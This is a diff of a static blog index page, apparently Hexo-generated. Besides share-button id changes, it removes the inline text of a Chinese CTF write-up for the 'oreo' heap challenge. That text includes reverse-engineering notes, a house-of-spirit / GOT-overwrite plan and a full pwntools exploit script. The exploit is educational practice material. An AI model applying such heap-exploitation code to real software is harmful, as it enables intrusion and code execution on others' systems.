@@ -79,55 +79,18 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/10/03/fastbin-attack/" data-id="ckuh24lai0001qkvk5pj1cvoq" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/03/fastbin-attack/" data-id="ckuh26lp20002ywvk947o3s6l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来是想把ctfwiki里fastbin attack的内容全部写完再写的，结果做到下一题摆了，一直逆向逆不明白，就先把这篇写了吧</p>
-<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p><img src="/2021/10/03/fastbin-attack/1-1633514214756.png" alt="1"></p>
-<p>老样子，先执行文件看一下大概功能，大概是这6个，然后扔进32位的ida</p>
-<p>找到main函数，发现他就是执行了这个函数将他命名位menu菜单函数，这题也是典型的菜单题。</p>
-<p>功能大概添加武器，展示武器，订购武器，为你的订购留下信息，最后就是展示大概情况吧。</p>
-<p><img src="/2021/10/03/fastbin-attack/2-1633514581457.png" alt="2"></p>
-<p>我们将每个函数功能改成合适的名字，在ida里面拖黄按n就可以改，我们先看add函数</p>
-<p><img src="/2021/10/03/fastbin-attack/3-1633515155557.png" alt="3"></p>
-<p>我们一行行看，如果有一些数据命名不一样就是我用上面的方法自己改的，为了美观。</p>
-<p>首先 v1会记录上一个chunk的地址，然后新malloc一个chunk并将chunk地址赋值给原先chunk_addr这个指针</p>
-<p>然后，将上一个chunk的地址也就是v1，赋值到chunk_addr + 13*4个字节的位置，乘4时因为DWORD四个字节</p>
-<p>set0的功能暂时我也没逆明白，对这题没有太大影响。</p>
-<p>然后同理在chunk_addr+25个字节处写入56个字节的name，并且下一行在chunk_addr的起始位置写入56个字节的description，这里存在溢出。</p>
-<p>最后给add_times+1表示完成了一次add，注意add_times的位置，在bss段的804A2A4，这里后面可以用到。至此一个武器的生产完成，一个武器的struct也如上面所述，写个伪代码大概就是</p>
-<p>struct Rifle</p>
-<p>{</p>
-<p>​    char name[27]</p>
-<p>​    char description[25]</p>
-<p>​    char *last_chunk_addr</p>
-<p>}</p>
-<p>下面是show函数</p>
-<p><img src="/2021/10/03/fastbin-attack/4-1633515069147.png" alt="4"></p>
-<p>这个比较容易看，就是一个循环遍历通过单链表的指针把之前每个武器的name和decription打印出来</p>
-<p>另外一个比较重要的order函数</p>
-<p><img src="/2021/10/03/fastbin-attack/6.png" alt="6"></p>
-<p>还是一行行看，v1记录chunk_addr，这里依然是借助了单链表的结构遍历并且free掉，dword_804A2A0记录add的次数</p>
-<p>leave_message</p>
-<p><img src="/2021/10/03/fastbin-attack/5.png" alt="5"></p>
-<p>往0x804a2a8处写入128个字节的数据，这里也是后面可以用到。</p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>house_of_spirit，我的理解是在一个无法控制的内存区域，伪造一个chunk，然后我们可以通过程序本身提供的功能对chunk的任意读写的功能，以此来getshell</p>
-<p>这题的话，通过add里面的溢出，将last_chunk改为got表地址，并且通过show函数将got表地址打印出来，从而泄露libc地址，我们发现这题没有开启 RELRO ，意味我们可以修改 got 表地址，同时，我们发现我们可以通过leave向0x804a2a8实现任意写的能力，于是我们希望在这里构造一个fake_chunk，这里注意，0x804a2a8这里其实藏了一个指针，很多wp都没有说到，我们用add将指针改为strlen的got表地址，然后通过leave输入system的got表地址，就可以完成strlen@got表的覆写，从而getshell。</p>
-<h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><p>先贴exp</p>
-<p>from pwn import *<br>p = process(“./oreo”)<br>elf = ELF(“./oreo”)<br>libc =ELF(‘/lib32/libc.so.6’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’<br>def add(name,desc):<br>    p.sendline(‘1’)<br>    p.sendline(name)<br>    p.sendline(desc)<br>def show():<br>    p.sendline(‘2’)<br>def order():<br>    p.sendline(‘3’)<br>def leave(msg):<br>    p.sendline(‘4’)<br>    p.sendline(msg)<br>name = b’a’*27 +p32(elf.got[‘puts’])<br>desc = b’b’*25<br>add(name,desc)<br>show()<br>p.recvuntil(‘Description: ‘)<br>#p.recvuntil(‘Name: ‘)<br>p.recvuntil(‘Description: ‘)<br>puts_addr = u32(p.recv(4))<br>libc_base = puts_addr - libc.symbols[“puts”]<br>system_addr = libc_base + libc.symbols[“puts”]<br>#gdb.attach(p)<br>target = 0x0804A2A8<br>for i in range(0x3e):<br>    add(b’a’*27+p32(0),b’a’*25)<br>vulnname = b’a’*27 + p32(target)<br>add(vulnname,b’a’*25)<br>padding = 0x38-(0xc0-0xa8)-4<br>payload = b’a’*padding+b’\x00’*4+b’a’*4+p32(0x40)<br>leave(payload)<br>order()<br>strlen_got_addr = p32(elf.got[‘strlen’])<br>add(b’b’,strlen_got_addr)<br>leave(p32(system_addr) + b’;bin/sh’)<br>#gdb.attach(p)<br>p.interactive()</p>
-<p>这里我本地是完成getshell的交互了，但是不知道为什么输入命令行就EOF了…应该是本地libc小版本有问题，先不管了吧，比赛时候会给libc的。</p>
-<p>然后贴一下0x804a2a8的调试结果</p>
-<p><img src="/2021/10/03/fastbin-attack/7-1633617863879.png" alt="7"></p>
-<p><img src="/2021/10/03/fastbin-attack/8.png" alt="8"></p>
-<p>一开始自己死活不明白为什么写进去的是strlen的got表地址，再写system的地址就可以完成覆写，这里发现原来leave是通过内存中的指针进行写入的，而add是直接写入内存，所以还是要多动手实践。</p>
-<p>然后就是构造fake_chunk的细节：next_chunk的size位要不大不小，自己的size要满足fastbin</p>
-<p>多的就不说了，本wp仅用于个人反思，因为我懒所以写的可能不是很详细，下面贴两个我觉得写的不错的师傅wp，大家可以去那里学习</p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/caa34a3218b8">https://www.jianshu.com/p/caa34a3218b8</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/12357237.html">https://www.cnblogs.com/luoleqi/p/12357237.html</a></p>
-
+        
+          <p class="article-more-link">
+            <a href="/2021/10/03/fastbin-attack/#more" class="more-link">More <span class="meta-nav">→</span></a>
+          </p>
+        
       
     </div><!-- .entry-content -->
 
@@ -163,7 +126,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="ckuh24lad0000qkvk0qdi0tg9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="ckuh26lov0000ywvk755p5432" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -215,7 +178,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/" data-id="ckuh24lal0002qkvk7dec9p96" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/" data-id="ckuh26lp30003ywvkh9xpey0u" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -262,7 +225,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/07/09/hello-world/" data-id="ckuh24lal0003qkvk0tfd3ibz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/07/09/hello-world/" data-id="ckuh26lp00001ywvk5bvydy4d" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
